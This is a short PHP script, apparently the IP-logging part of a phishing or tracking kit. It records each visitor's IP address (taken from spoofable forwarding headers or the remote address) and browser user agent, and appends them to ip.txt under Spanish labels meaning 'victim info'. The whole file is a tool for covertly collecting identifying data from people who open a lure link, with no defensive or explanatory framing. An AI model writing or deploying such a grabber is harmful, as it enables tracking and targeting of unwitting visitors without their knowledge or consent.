<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
        $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = "INFO. D VICTIMA:  ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$separator = "\n===============================";


$file = 'ip.txt';
$victim = "\nIP: ";
$fp = fopen($file, 'a');

fwrite($fp, $separator );
fwrite($fp, $victim );
fwrite($fp, $ipaddress );
fwrite($fp, $useragent );
fwrite($fp, $browser );
fwrite($fp, $separator );

fclose($fp);
